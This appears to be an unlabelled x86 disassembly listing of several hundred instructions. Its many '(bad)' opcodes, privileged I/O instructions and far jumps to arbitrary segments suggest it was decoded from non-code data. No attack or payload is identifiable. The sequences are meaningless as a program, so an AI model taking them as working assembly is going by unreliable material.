  69fd92:	dec    esi
  69fd93:	push   edi
  69fd94:	xchg   ebp,eax
  69fd95:	into   
  69fd96:	and    DWORD PTR [edi],edx
  69fd98:	sbb    BYTE PTR [ebx+0x36a61030],bh
  69fd9e:	dec    esp
  69fd9f:	add    eax,0x8712a213
  69fda4:	in     al,0x60
  69fda6:	sar    DWORD PTR [ebp-0x11],cl
  69fda9:	ret    0x2f9a
  69fdac:	(bad)  
  69fdad:	stc    
  69fdae:	cmc    
  69fdaf:	enter  0xcba5,0xa2
  69fdb3:	sbb    BYTE PTR [ecx+0x36],ah
  69fdb6:	in     eax,dx
  69fdb7:	ret    0xdd41
  69fdba:	or     eax,0xf16491bb
  69fdbf:	test   dl,0xc4
  69fdc2:	sub    BYTE PTR [eax],bh
  69fdc4:	jge    0x69fd9f
  69fdc6:	cwde   
  69fdc7:	mov    ds:0x78f15c1e,al
  69fdcc:	ret    
  69fdcd:	in     eax,0x3b
  69fdcf:	jp     0x69fde4
  69fdd1:	call   0xf2734bd6
  69fdd6:	cmp    cl,BYTE PTR ds:[ebp+0x54c873b0]
  69fddd:	scas   eax,DWORD PTR es:[edi]
  69fdde:	mov    DWORD PTR [edi*1+0x624502d8],edx
  69fde5:	test   eax,0x910a67aa
  69fdea:	mov    ebx,0x118fe686
  69fdef:	jne    0x69fdf8
  69fdf1:	sub    cl,ah
  69fdf3:	jge    0x69fdf2
  69fdf5:	add    dh,BYTE PTR [ebx]
  69fdf7:	or     BYTE PTR [edx-0x3b],dh
  69fdfa:	add    al,0x40
  69fdfc:	pushf  
  69fdfd:	std    
  69fdfe:	dec    ebp
  69fdff:	sub    DWORD PTR [eax-0x1b],ebp
  69fe02:	test   BYTE PTR [eax-0x1f],dl
  69fe05:	out    dx,eax
  69fe06:	(bad)  
  69fe08:	popa   
  69fe09:	sti    
  69fe0a:	fucomi st,st(0)
  69fe0c:	or     al,0x81
  69fe0e:	les    ebx,FWORD PTR [edi]
  69fe10:	dec    ebp
  69fe11:	add    al,0x86
  69fe13:	stos   DWORD PTR es:[edi],eax
  69fe14:	sbb    eax,0x6c3457d8
  69fe19:	outs   dx,DWORD PTR ds:[esi]
  69fe1a:	out    0xbf,al
  69fe1c:	shl    DWORD PTR [ecx],cl
  69fe1e:	mul    esi
  69fe20:	scas   eax,DWORD PTR es:[edi]
  69fe21:	sbb    al,0x34
  69fe23:	enter  0xb0b8,0xb5
  69fe27:	ja     0x69fdaf
  69fe29:	or     eax,0xcc582e75
  69fe2e:	in     eax,dx
  69fe2f:	std    
  69fe30:	int    0xef
  69fe32:	outs   dx,BYTE PTR ds:[esi]
  69fe33:	sti    
  69fe34:	push   esi
  69fe35:	jbe    0x69fdfd
  69fe37:	outs   dx,BYTE PTR ds:[esi]
  69fe38:	push   edx
  69fe39:	push   es
  69fe3a:	and    al,0x1f
  69fe3c:	push   ebx
  69fe3d:	loopne 0x69fe47
  69fe3f:	std    
  69fe40:	mov    dl,0x18
  69fe42:	xor    cl,BYTE PTR ss:[edx+eiz*8+0x28]
  69fe47:	push   ds
  69fe48:	call   0x59f:0x1d061c25
  69fe4f:	push   edx
  69fe50:	mov    dh,0x53
  69fe52:	(bad)  
  69fe54:	xchg   ebp,eax
  69fe55:	pop    ebp
  69fe56:	outs   dx,DWORD PTR ds:[esi]
  69fe57:	cmp    dh,BYTE PTR [ebx+0x10b460a9]
  69fe5d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  69fe5e:	test   al,0x3f
  69fe60:	jge    0x69fe2f
  69fe62:	mov    bl,0x62
  69fe64:	cmp    cl,BYTE PTR [edi+eiz*2]
  69fe67:	jne    0x69fe87
  69fe69:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  69fe6a:	bound  edi,QWORD PTR ss:[edx]
  69fe6d:	pop    esp
  69fe6e:	inc    edx
  69fe6f:	fisub  WORD PTR [edi-0x57d5dab5]
  69fe75:	js     0x69feaa
  69fe77:	(bad)  
  69fe78:	into   
  69fe79:	aas    
  69fe7a:	xor    cl,BYTE PTR [ebx]
  69fe7c:	mov    eax,ds:0x4c6d3124
  69fe81:	cwde   
  69fe82:	or     BYTE PTR [esi],ah
  69fe84:	pop    esi
  69fe85:	and    BYTE PTR [edi+0x34],bh
  69fe88:	lea    edi,[edi]
  69fe8a:	test   ebx,edx
  69fe8c:	push   esp
  69fe8d:	inc    esi
  69fe8e:	aaa    
  69fe8f:	inc    esi
  69fe90:	das    
  69fe91:	(bad)  
  69fe92:	inc    edx
  69fe93:	adc    ebx,DWORD PTR [edx+0x5d50b279]
  69fe99:	imul   ecx,DWORD PTR [ecx+ebx*8-0x292da17a],0xffffffee
  69fea1:	pop    ds
  69fea2:	inc    ecx
  69fea3:	cli    
  69fea4:	and    eax,DWORD PTR [esi]
  69fea6:	cmp    al,0x39
  69fea8:	and    eax,0x90b7efa3
  69fead:	push   ecx
  69feae:	adc    DWORD PTR [edx+0x7db53e52],edx
  69feb4:	(bad)  
  69feb6:	push   edi
  69feb7:	adc    edx,ecx
  69feb9:	fnstenv [ecx]
  69febb:	push   esp
  69febc:	fidiv  DWORD PTR [esi]
  69febe:	pop    es
  69febf:	addr16 push 0xe7c9277d
  69fec5:	push   ss
  69fec6:	jg     0x69fe61
  69fec8:	jl     0x69ff05
  69feca:	popf   
  69fecb:	cmp    BYTE PTR [esi+0x6fb1f098],al
  69fed1:	pop    edi
  69fed2:	std    
  69fed3:	and    edi,edx
  69fed5:	and    eax,0x435be6ee
  69feda:	frstor [ebp-0x42]
  69fedd:	fist   DWORD PTR [ebx]
  69fedf:	jg     0x69ff11
  69fee1:	jp     0x69ff05
  69fee3:	sbb    BYTE PTR [ecx-0x4e0b737d],bh
  69fee9:	or     ch,BYTE PTR [eax]
  69feeb:	into   
  69feec:	jge    0x69fe78
  69feee:	shl    DWORD PTR [eax-0x3c],cl
  69fef1:	aad    0x7a
  69fef3:	and    al,0x38
  69fef5:	mov    bh,0xed
  69fef7:	xchg   edx,eax
  69fef8:	in     eax,dx
  69fef9:	mov    ebx,0xe233024e
  69fefe:	adc    eax,0x6b6ac35c
  69ff03:	addr16 sahf 
  69ff05:	mov    eax,0xdf5acdd9
  69ff0a:	and    eax,edi
  69ff0c:	test   DWORD PTR [esi],eax
  69ff0e:	test   edi,ebx
  69ff10:	xor    BYTE PTR [ebp+0x31f2ec6e],bl
  69ff16:	cmp    eax,0x93269287
  69ff1b:	pop    edi
  69ff1c:	fs or  eax,0x70668e4b
  69ff22:	or     DWORD PTR [eax],ebp
  69ff24:	aaa    
  69ff25:	mov    eax,ds
  69ff27:	mov    al,ds:0xcebb2352
  69ff2c:	call   0x3c99:0xddb947f9
  69ff33:	sbb    ah,ch
  69ff35:	adc    cl,BYTE PTR [di+0x3d2c]
  69ff3a:	inc    ecx
  69ff3b:	sub    al,0xcd
  69ff3d:	inc    DWORD PTR [esi+0x7b]
  69ff40:	mov    eax,ds:0x9f86d6b5
  69ff45:	mov    al,0x30
  69ff47:	into   
  69ff48:	jmp    0x69ff68
  69ff4a:	(bad)  
  69ff4b:	call   0x9227:0xb00da583
  69ff52:	ror    BYTE PTR [edi-0x2429ce6c],0x5f
  69ff59:	dec    esp
  69ff5a:	repnz fwait
  69ff5c:	inc    esp
  69ff5d:	inc    ecx
  69ff5e:	and    eax,0xc46282d6
  69ff63:	icebp  
  69ff64:	sub    BYTE PTR [edi-0x6f],bh
  69ff67:	push   eax
  69ff68:	cmp    BYTE PTR [ebp+0x64],cl
  69ff6b:	lods   al,BYTE PTR ds:[esi]
  69ff6c:	arpl   WORD PTR [ecx+0x62],si
  69ff6f:	push   0xbb0bf7f1
  69ff74:	pop    edx
  69ff75:	push   ds
  69ff76:	push   eax
  69ff77:	icebp  
  69ff78:	and    BYTE PTR [eax-0x4b39b045],bh
  69ff7e:	cmp    eax,0x9d1e16b9
  69ff83:	mov    eax,0x9466c13f
  69ff88:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  69ff89:	jmp    0x3240:0x5760ad8e
  69ff90:	inc    esp
  69ff91:	mov    al,0xea
  69ff93:	clc    
  69ff94:	sar    eax,1
  69ff96:	sub    esi,DWORD PTR [ebp-0x32af6616]
  69ff9c:	ror    ebp,1
  69ff9e:	fsub   QWORD PTR [esi+eiz*8+0x1c04132f]
  69ffa5:	pop    ebp
  69ffa6:	ret    
  69ffa7:	mov    al,ds:0x9d3769f5
  69ffac:	inc    edx
  69ffad:	dec    esp
  69ffae:	cmp    BYTE PTR ds:0x803187e3,ah
  69ffb4:	out    0x21,eax
  69ffb6:	clc    
  69ffb7:	add    dl,BYTE PTR [esi+ebx*1+0x1a]
  69ffbb:	mov    ds:0xc4b9afe1,eax
  69ffc0:	lods   al,BYTE PTR ds:[esi]
  69ffc1:	add    edx,DWORD PTR [ebx+0x19]
  69ffc4:	lea    ecx,[eax]
  69ffc6:	push   ecx
  69ffc7:	and    BYTE PTR [esi],0x10
  69ffca:	adc    ecx,esp
  69ffcc:	retf   0x9ed4
  69ffcf:	das    
  69ffd0:	mov    ah,0xe0
  69ffd2:	and    eax,DWORD PTR [eax+0x4f]
  69ffd5:	aas    
  69ffd6:	int    0x94
  69ffd8:	iret   
  69ffd9:	push   ebp
  69ffda:	cdq    
  69ffdb:	mov    eax,ds:0xb0e76dbb
  69ffe0:	popa   
  69ffe1:	mov    ds:0xc9366d17,eax
  69ffe6:	lea    ebp,[esi+esi*8-0x6629a615]
  69ffed:	xchg   esi,eax
  69ffee:	aas    
  69ffef:	mov    cl,0xe1
  69fff1:	mov    ds:0xed733c78,eax
  69fff6:	mov    edi,0x8e232131
  69fffb:	mov    WORD PTR [edx+0x187a0e1e],?
  6a0001:	sub    eax,0x7f1da8c4
  6a0006:	sub    DWORD PTR [eax+0x220fb792],edi
  6a000c:	hlt    
  6a000d:	adc    eax,0x5be6b2a4
  6a0012:	stos   DWORD PTR es:[di],eax
  6a0014:	popf   
  6a0015:	hlt    
  6a0016:	push   ss
  6a0017:	lock arpl WORD PTR [ecx],bx
  6a001a:	sub    ch,BYTE PTR [ebp+0x2fa78ace]
  6a0020:	pop    ebp
  6a0021:	xor    BYTE PTR [edi-0x7b4b3e83],bl
  6a0027:	fst    DWORD PTR [edi]
  6a0029:	pop    esi
  6a002a:	push   edi
  6a002b:	sub    DWORD PTR [ecx],0x562e1410
  6a0031:	pop    ecx
  6a0032:	xchg   BYTE PTR [eax+eax*1+0x30],ch
  6a0036:	xor    dl,al
  6a0038:	mov    edx,0xe4668544
  6a003d:	repz xor ecx,ebp
  6a0040:	add    al,0x87
  6a0042:	mov    eax,ds:0x80ead67a
  6a0047:	adc    al,BYTE PTR [eax-0x2f]
  6a004a:	sar    BYTE PTR [edi-0x6c],0x92
  6a004e:	dec    esp
  6a004f:	arpl   bp,sp
  6a0051:	dec    esp
  6a0052:	cmc    
  6a0053:	jle    0x69ffdb
  6a0055:	(bad)  
  6a0056:	rcr    BYTE PTR [ebx+0x694e9c75],cl
  6a005c:	sub    BYTE PTR [eax],dl
  6a005e:	inc    ecx
  6a005f:	fld    TBYTE PTR [eax-0xb139055]
  6a0065:	call   0x7650:0x374abc15
  6a006c:	js     0x6a008d
  6a006e:	aam    0xe2
  6a0070:	test   DWORD PTR [edi],ecx
  6a0072:	xor    bl,ch
  6a0074:	pop    eax
  6a0075:	jbe    0x6a00b5
  6a0077:	mov    ds:0xfee6bb1c,eax
  6a007c:	inc    eax
  6a007d:	in     eax,dx
  6a007e:	iret   
  6a007f:	add    BYTE PTR [ecx],cl
  6a0081:	idiv   BYTE PTR [ecx+ecx*1-0x4ea7b671]
  6a0088:	ret    
  6a0089:	inc    edi
  6a008a:	push   0x4f8ecdc7
  6a008f:	push   ds
  6a0090:	adc    eax,0xff11ca68
  6a0095:	sbb    BYTE PTR [eax],dl
  6a0097:	gs (bad) 
  6a009a:	cmp    cl,bl
  6a009c:	das    
  6a009d:	fcomp  QWORD PTR [ecx+esi*2]
  6a00a0:	jnp    0x6a00c1
  6a00a2:	pop    esi
  6a00a3:	cmp    bh,BYTE PTR [edx]
  6a00a5:	dec    edi
  6a00a6:	in     eax,dx
  6a00a7:	pop    edx
  6a00a8:	(bad)  
  6a00a9:	xlat   BYTE PTR ds:[ebx]
  6a00aa:	cmp    al,dh
  6a00ac:	jns    0x6a00e7
  6a00ae:	pop    ebx
  6a00af:	cmp    esi,DWORD PTR [edx-0x66]
  6a00b2:	push   es
  6a00b3:	lods   al,BYTE PTR ds:[esi]
  6a00b4:	xor    edx,DWORD PTR [ebx+0x112ba884]
  6a00ba:	pop    esi
  6a00bb:	(bad)  
  6a00bc:	jno    0x6a0096
  6a00be:	mov    ?,esp
  6a00c0:	jns    0x6a0121
  6a00c2:	jbe    0x6a0057
  6a00c4:	push   edi
  6a00c5:	cmc    
  6a00c6:	sub    DWORD PTR [edx],ebp
  6a00c8:	cmc    
  6a00c9:	or     BYTE PTR ds:0x144c9350,0x31
  6a00d0:	mov    ebp,0x5f8c4249
  6a00d5:	(bad)  
  6a00d6:	fstp   TBYTE PTR [ecx+0x36]
  6a00d9:	mov    gs,WORD PTR ds:0xca9b7a6e
  6a00df:	or     edi,DWORD PTR [ebp-0x69]
  6a00e2:	push   edi
  6a00e3:	pop    ds
  6a00e4:	sbb    DWORD PTR [ebx-0x5b854ab2],esi
  6a00ea:	mov    eax,DWORD PTR [edi+0x24d4a850]
  6a00f0:	fidivr WORD PTR [ecx+0x22]
  6a00f3:	inc    esp
  6a00f4:	dec    bl
  6a00f6:	push   edi
  6a00f7:	sub    BYTE PTR fs:[eax],ah
  6a00fa:	mov    esp,0x8bc50592
  6a00ff:	push   0xffffffa1
  6a0101:	fcom   QWORD PTR [esi-0x80]
  6a0104:	pop    esi
  6a0105:	daa    
  6a0106:	mov    edi,ecx
  6a0108:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  6a0109:	rcl    BYTE PTR [edx-0x2a64b236],cl
  6a010f:	lahf   
  6a0110:	pop    ds
  6a0111:	fst    QWORD PTR [esi]
  6a0113:	mov    ds:0x7a09179f,al
  6a0118:	lods   al,BYTE PTR ds:[esi]
  6a0119:	cmp    eax,DWORD PTR ds:0x3fb5f5a
  6a011f:	add    eax,0x71d9dc3c
  6a0124:	cld    
  6a0125:	mov    edx,0xfc20f1f3
  6a012a:	mov    bl,0x46
  6a012c:	add    esi,ebp
  6a012e:	repz int3 
  6a0130:	cmp    bh,dl
  6a0132:	test   eax,0xdc361752
  6a0137:	pusha  
  6a0138:	leave  
  6a0139:	mov    DWORD PTR [edx+0x32],edi
  6a013c:	push   ds
  6a013d:	add    ecx,DWORD PTR [ebx-0x76]
  6a0140:	xor    eax,0xbd8fd3aa
  6a0145:	ret    
  6a0146:	or     DWORD PTR [esi],esp
  6a0148:	aam    0x1a
  6a014a:	mov    esi,esp
  6a014c:	nop
  6a014d:	ins    DWORD PTR es:[edi],dx
  6a014e:	dec    ebx
  6a014f:	popa   
  6a0150:	mov    eax,0x628ffc16
  6a0155:	mov    dl,0xe0
  6a0157:	xchg   BYTE PTR [esi+esi*1+0x76],cl
  6a015b:	mov    esp,0x524564c1
  6a0160:	retf   0xc317
  6a0163:	xor    eax,0x20c7d021
  6a0168:	gs (bad) 
  6a016a:	stc    
  6a016b:	adc    ch,BYTE PTR [esp+esi*2-0x6d]
  6a016f:	ret    
  6a0170:	jnp    0x6a01dc
  6a0172:	cmc    
  6a0173:	mov    dh,0xa7
  6a0175:	and    DWORD PTR [ecx-0x22d10668],0xfd1ed0bc
  6a017f:	arpl   bp,bp
  6a0181:	dec    esp
  6a0182:	ror    ch,1
  6a0184:	in     al,dx
  6a0185:	js     0x6a0174
  6a0187:	sbb    al,0x38
  6a0189:	jmp    0xf7b09a95
  6a018e:	fsubr  DWORD PTR [eax-0x5894123a]
  6a0194:	sbb    BYTE PTR [ebx+0x2217f7a2],bh
  6a019a:	push   eax
  6a019b:	or     ah,BYTE PTR [ecx+0x6a]
  6a019e:	mov    esi,0x64b1647b
  6a01a3:	jns    0x6a01e3
  6a01a5:	mov    edx,0xb6b128fd
  6a01aa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  6a01ab:	jmp    0x9ab8:0x4e344bfc
  6a01b2:	mov    ds:0xde61be0f,al
  6a01b7:	fwait
  6a01b8:	jns    0x6a01ce
  6a01ba:	inc    eax
  6a01bb:	lahf   
  6a01bc:	xlat   BYTE PTR ds:[ebx]
  6a01bd:	and    BYTE PTR [edi],al
  6a01bf:	jno    0x6a01e0
  6a01c1:	rcr    BYTE PTR [ebp+0x31],0x59
  6a01c5:	cmp    ah,BYTE PTR [ecx-0x1516a9ac]
  6a01cb:	loop   0x6a022f
  6a01cd:	jae    0x6a01dc
  6a01cf:	iret   
  6a01d0:	aas    
  6a01d1:	(bad)  
  6a01d2:	and    ah,al
  6a01d4:	mov    al,0x15
  6a01d6:	and    BYTE PTR [edi-0xe9793d],dh
  6a01dc:	je     0x6a019c
  6a01de:	scas   eax,DWORD PTR es:[edi]
  6a01df:	push   ebp
  6a01e0:	idiv   BYTE PTR [eax+0x2d]
  6a01e3:	sbb    edx,DWORD PTR [ebp-0x3fd5465e]
  6a01e9:	mov    BYTE PTR [eax+ebx*2],al
  6a01ec:	mov    al,0x9f
  6a01ee:	push   edi
  6a01ef:	dec    bl
  6a01f1:	push   edi
  6a01f2:	mov    dh,0x40
  6a01f4:	add    DWORD PTR [esi+0xc],0x261c4904
  6a01fb:	cmp    BYTE PTR [esi],0x94
  6a01fe:	xchg   edx,edx
  6a0200:	lea    esp,[ebx+edx*4]
  6a0203:	clc    
  6a0204:	mov    ebp,0xa5f62b0
  6a0209:	shr    DWORD PTR [ecx],cl
  6a020b:	int3   
  6a020c:	ins    DWORD PTR es:[edi],dx
  6a020d:	mov    bh,0x83
  6a020f:	outs   dx,DWORD PTR ds:[esi]
  6a0210:	dec    ecx
  6a0211:	(bad)  
  6a0212:	fisub  DWORD PTR [ebx+edx*4]
  6a0215:	or     eax,DWORD PTR [ebx-0x5435af7c]
  6a021b:	ffree  st(2)
  6a021d:	fs pop ecx
  6a021f:	sub    DWORD PTR [eax-0x50],edi
  6a0222:	sti    
  6a0223:	xor    al,dh
  6a0225:	xlat   BYTE PTR ds:[ebx]
  6a0227:	(bad)  [edx-0x66289b63]
  6a022d:	adc    eax,0x1fba2e0e
  6a0232:	fdivr  st(6),st
  6a0234:	mov    ds,ebx
  6a0236:	jmp    DWORD PTR [ebp-0x13]
  6a0239:	out    0x6d,al
  6a023b:	aam    0x79
  6a023d:	mov    eax,ds:0x5a8c21b3
  6a0242:	jecxz  0x6a01f6
  6a0244:	pop    ss
  6a0245:	jmp    0x2a78becb
  6a024a:	sbb    dl,BYTE PTR [ebx-0x27bcd161]
  6a0250:	iret   
  6a0251:	fisttp WORD PTR [ebx]
  6a0253:	les    eax,FWORD PTR [ebp-0x52ef62ae]
  6a0259:	mov    edi,0x3925599b
  6a025e:	ds out dx,al
  6a0260:	pop    ss
  6a0261:	mov    al,ds:0xd3e79474
  6a0266:	sbb    DWORD PTR [ebx+0x2d],esp
  6a0269:	pop    ss
  6a026a:	cli    
  6a026b:	ja     0x6a02a2
  6a026d:	push   esp
  6a026e:	hlt    
  6a026f:	scas   al,BYTE PTR es:[edi]
  6a0270:	mov    DWORD PTR ds:[edi-0x5b480d93],esi
  6a0277:	outs   dx,DWORD PTR ds:[esi]
  6a0278:	jecxz  0x6a027e
  6a027a:	(bad)  
  6a027c:	add    edi,ecx
  6a027e:	jo     0x6a02f3
  6a0280:	je     0x6a0247
  6a0282:	adc    BYTE PTR [eax+ebx*8],0x0
  6a0286:	jbe    0x6a0283
  6a0288:	(bad)  [edi]
  6a028a:	fs xchg ebp,eax
  6a028c:	push   edi
  6a028d:	leave  
  6a028e:	in     eax,0x99
  6a0290:	push   ss
  6a0291:	adc    ch,BYTE PTR [ebp+eiz*8+0x6a]
  6a0295:	imul   edx,DWORD PTR [edx-0x59e6c074],0xd8f03c31
  6a029f:	xchg   ebp,eax
  6a02a0:	inc    eax
  6a02a2:	or     DWORD PTR [ebp+0x32],0x6a36f86c
  6a02a9:	adc    al,0x58
  6a02ab:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  6a02ac:	mov    WORD PTR [edi-0x5033dbc0],ds
  6a02b2:	stc    
  6a02b3:	fwait
  6a02b4:	add    eax,ecx
  6a02b6:	mov    ds:0x2b4d20f7,al
  6a02bb:	ret    
  6a02bc:	push   cs
  6a02bd:	mov    al,ds:0x4d8227e1
  6a02c2:	xor    bh,cl
  6a02c4:	push   es
  6a02c5:	jbe    0x6a032b
  6a02c7:	ds inc ecx
  6a02c9:	shr    DWORD PTR [edx-0x1e0c0f85],0x2c
  6a02d0:	or     ebp,DWORD PTR [ebx]
  6a02d2:	xchg   edx,eax
  6a02d3:	addr16 ja 0x6a0314
  6a02d6:	jmp    0x35a1c409
  6a02db:	retf   0x7ae6
  6a02de:	popf   
  6a02df:	xor    esp,DWORD PTR [ebx]
  6a02e1:	shr    ecx,cl
  6a02e3:	push   ebx
  6a02e4:	repnz mov ecx,0x50381a6d
  6a02ea:	and    eax,0x51a36edf
  6a02ef:	popa   
  6a02f0:	inc    esp
  6a02f1:	mov    ds:0x2132dea3,al
  6a02f6:	(bad)  
  6a02f7:	in     eax,0x98
  6a02f9:	fdiv   st,st(1)
  6a02fb:	jno    0x6a0308
  6a02fd:	sbb    eax,0xd73cb3cc
  6a0302:	add    BYTE PTR [ebx],bl
  6a0304:	jbe    0x6a0314
  6a0306:	mov    ?,WORD PTR [edi]
  6a0308:	in     eax,dx
  6a0309:	and    al,0xdf
  6a030b:	xchg   esp,eax
  6a030c:	sbb    BYTE PTR [esi+0x38],dh
  6a030f:	icebp  
  6a0310:	sti    
  6a0311:	gs xchg ecx,eax
  6a0313:	lods   eax,DWORD PTR ds:[esi]
  6a0314:	retf   0xc324
  6a0317:	xor    al,0xe2
  6a0319:	enter  0x697,0x81
  6a031d:	aad    0xd
  6a031f:	sar    DWORD PTR [ecx-0x4b],1
  6a0322:	and    DWORD PTR [eax+0xa00c70f],0xad86d41c
  6a032c:	jge    0x6a02b4
  6a032e:	mov    esp,ecx
  6a0330:	cmc    
  6a0331:	xchg   bh,ch
  6a0333:	fcmovb st,st(3)
  6a0335:	into   
  6a0336:	inc    eax
  6a0337:	dec    ecx
  6a0338:	jae    0x6a0360
  6a033a:	mov    esi,0x3739fba3
  6a033f:	cld    
  6a0340:	push   ecx
  6a0341:	nop
  6a0342:	pop    ds
  6a0343:	push   gs
  6a0345:	ja     0x6a02d0
  6a0347:	lods   al,BYTE PTR ds:[esi]
  6a0348:	in     eax,dx
  6a0349:	jmp    0x6a03b5
  6a034b:	daa    
  6a034c:	mov    DWORD PTR [esi+0x7a],edx
  6a034f:	jge    0x6a02f9
  6a0351:	xchg   ebp,eax
  6a0352:	out    0x5d,al
  6a0354:	aaa    
  6a0355:	push   edx
  6a0356:	frstor [ebp-0x36]
  6a0359:	mov    al,ds:0xbe7592ec
  6a035e:	xchg   edx,eax
  6a035f:	pop    edi
  6a0360:	test   DWORD PTR [ecx-0x1b],ecx
  6a0363:	mov    DWORD PTR [ebp-0x4d],esi
  6a0366:	jae    0x6a0389
  6a0368:	stc    
  6a0369:	mov    bh,0x52
  6a036b:	pop    edi
  6a036c:	or     DWORD PTR ds:0x1336caa1,0xffffffee
  6a0373:	repnz xor ch,dl
  6a0376:	xchg   edx,eax
  6a0377:	cmp    al,0x82
  6a0379:	pop    ecx
  6a037a:	and    cl,BYTE PTR [edx]
  6a037c:	js     0x6a03c1
  6a037e:	loopne 0x6a03bd
  6a0380:	xor    BYTE PTR [edx+0x3e49c4ff],0x5d
  6a0387:	jmp    0x6e686248
  6a038c:	jnp    0x6a036a
  6a038e:	mov    eax,ds:0x41f6530f
  6a0393:	dec    esp
  6a0394:	bound  eax,QWORD PTR [ebp-0x396d59ed]
  6a039a:	sahf   
  6a039b:	scas   al,BYTE PTR es:[edi]
  6a039c:	cmp    eax,0x44217061
  6a03a1:	stos   BYTE PTR es:[edi],al
  6a03a2:	add    al,0x9f
  6a03a4:	mov    bh,0xeb
  6a03a6:	fnstcw WORD PTR [edi-0x65e7fa7c]
  6a03ac:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  6a03ad:	xchg   BYTE PTR [ebp+0x6a5a9783],dl
  6a03b3:	repnz neg ch
  6a03b6:	inc    eax
  6a03b7:	lea    ebp,[edx+0x12]
  6a03ba:	jbe    0x6a041d
  6a03bc:	sbb    ebp,ebx
  6a03be:	int3   
  6a03bf:	xchg   ecx,eax
  6a03c0:	push   es
  6a03c1:	xor    edx,DWORD PTR [edi]
  6a03c3:	sbb    DWORD PTR [ecx+0x5f],ebp
  6a03c6:	(bad)  
  6a03c7:	cld    
  6a03c8:	dec    ebp
  6a03c9:	xor    ebp,ebx
  6a03cb:	xchg   DWORD PTR [ecx],ecx
  6a03cd:	cmp    eax,0x364f041f
  6a03d2:	or     ebp,DWORD PTR [edx]
  6a03d4:	push   esi
  6a03d5:	fs loop 0x6a03d5
  6a03d8:	add    esi,edi
  6a03da:	mov    edi,0x5c9d7519
  6a03df:	or     dl,BYTE PTR [esi-0x7127a08a]
  6a03e5:	lods   al,BYTE PTR ds:[esi]
  6a03e6:	js     0x6a0404
  6a03e8:	dec    edi
  6a03e9:	mov    eax,eax
  6a03eb:	ja     0x6a03d9
  6a03ed:	mov    dl,0x9c
  6a03ef:	xchg   ebx,eax
  6a03f0:	loopne 0x6a0400
  6a03f2:	ds push ebx
  6a03f4:	pop    edx
  6a03f5:	mov    edx,0x21e2c6eb
  6a03fa:	in     al,dx
  6a03fb:	xor    ebp,DWORD PTR [edx-0x21b5159f]
  6a0401:	push   esi
  6a0402:	scas   al,BYTE PTR es:[edi]
  6a0403:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  6a0404:	int    0x9c
  6a0406:	cmp    BYTE PTR [ebp-0x78e8d31d],dl
  6a040c:	stos   DWORD PTR es:[edi],eax
  6a040d:	pop    ebx
  6a040e:	mov    cl,0x5c
  6a0410:	cmp    al,0xc
  6a0412:	ds xchg edi,eax
  6a0414:	sub    dl,0x1d
  6a0417:	jp     0x6a03ea
  6a0419:	into   
  6a041a:	sbb    al,0x7f
  6a041c:	sub    edi,ecx
  6a041e:	inc    ecx
  6a041f:	pusha  
  6a0420:	mov    ds:0xa87a9eae,al
  6a0425:	jno    0x6a048e
  6a0427:	outs   dx,DWORD PTR ds:[esi]
  6a0428:	fdiv   QWORD PTR [edi*4+0x3febc731]
  6a042f:	out    dx,eax
  6a0430:	sbb    BYTE PTR [ecx],0xa3
  6a0433:	pop    esi
  6a0434:	or     dh,ah
  6a0436:	mov    edi,0xdde58ae2
  6a043b:	jl     0x6a043e
  6a043d:	push   eax
  6a043e:	pop    ss
  6a043f:	lods   al,BYTE PTR ds:[esi]
  6a0440:	enter  0x607e,0x9c
  6a0444:	shl    BYTE PTR [ecx-0x430e99cf],cl
  6a044a:	ins    DWORD PTR es:[edi],dx
  6a044b:	dec    eax
  6a044c:	mov    bl,0xa7
  6a044e:	dec    edx
  6a044f:	loopne 0x6a03d1
  6a0451:	cmp    al,0x21
  6a0453:	mov    es:0x38d80932,eax
  6a0459:	xchg   esi,eax
  6a045a:	not    al
  6a045c:	dec    esi
  6a045d:	sub    eax,DWORD PTR [eax]
  6a045f:	push   0x53d67e28
  6a0464:	push   0x614f0a84
  6a0469:	aas    
  6a046a:	stos   BYTE PTR es:[edi],al
  6a046b:	(bad)  
  6a046d:	sbb    BYTE PTR [esi+0xa],bl
  6a0470:	std    
  6a0471:	sub    al,0xbd
  6a0473:	mov    ds:0x503c7076,al
  6a0478:	adc    eax,0x6388f1f5
  6a047d:	mov    bl,0x4f
  6a047f:	in     eax,0x99
  6a0481:	ins    DWORD PTR es:[edi],dx
  6a0482:	stos   BYTE PTR es:[edi],al
  6a0483:	xchg   BYTE PTR [ebx+0x46],bl
  6a0486:	jnp    0x6a0499
  6a0488:	aaa    
  6a0489:	retf   0xb2c5
  6a048c:	popaw  
  6a048e:	push   0xd49ec221
  6a0493:	aaa    
  6a0494:	or     eax,0xd9147674
  6a0499:	repnz mov DWORD PTR [edx],ebx
  6a049c:	sbb    ebp,DWORD PTR [esi+0x2d]
  6a049f:	jge    0x6a0444
  6a04a1:	pop    ebx
  6a04a2:	push   edi
  6a04a3:	push   0x3d
  6a04a5:	jbe    0x6a0452
  6a04a7:	sar    DWORD PTR [ebx-0x6a],0x78
  6a04ab:	ret    0x86a0
  6a04ae:	in     al,0xa7
  6a04b0:	mov    ebp,0xa243a9b4
  6a04b5:	enter  0x6a5b,0xfe
  6a04b9:	jo     0x6a0525
  6a04bb:	jl     0x6a051d
  6a04bd:	out    dx,al
  6a04be:	mov    bh,0x70
  6a04c0:	(bad)  
  6a04c1:	test   al,0x2e
  6a04c3:	fist   DWORD PTR [edx+0x4c]
  6a04c6:	lahf   
  6a04c7:	adc    al,0x6f
  6a04c9:	jmp    0xcc5:0x53b6ed5d
  6a04d0:	aaa    
  6a04d1:	ret    0xe486
  6a04d4:	jmp    0x6a04c3
  6a04d6:	div    ebp
  6a04d8:	scas   al,BYTE PTR es:[edi]
  6a04d9:	fnsave [esi+eiz*2-0x6b]
  6a04dd:	out    0xc9,al
  6a04df:	lahf   
  6a04e0:	pop    esi
  6a04e1:	dec    edx
  6a04e2:	test   eax,0x8f9d9eed
  6a04e7:	and    edi,eax
  6a04e9:	pop    es
  6a04ea:	mov    bh,0x16
  6a04ec:	loop   0x6a0480
  6a04ee:	std    
  6a04ef:	(bad)  
  6a04f0:	fistp  DWORD PTR [ebp+eiz*2-0xfc051bf]
